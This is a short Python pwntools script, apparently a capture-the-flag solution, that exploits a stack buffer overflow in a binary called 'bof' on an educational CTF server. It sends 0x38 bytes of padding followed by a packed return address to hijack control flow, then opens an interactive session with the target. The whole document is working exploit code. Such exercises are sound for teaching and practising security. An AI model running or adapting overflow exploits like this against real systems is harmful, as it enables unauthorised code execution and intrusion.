from pwn import *

# p = process('./bof')
p = remote('edu-ctf.csie.org', 10170)

ret = p64(0x40068b)

p.sendline(b'A' * 0x38 + ret)

p.interactive()
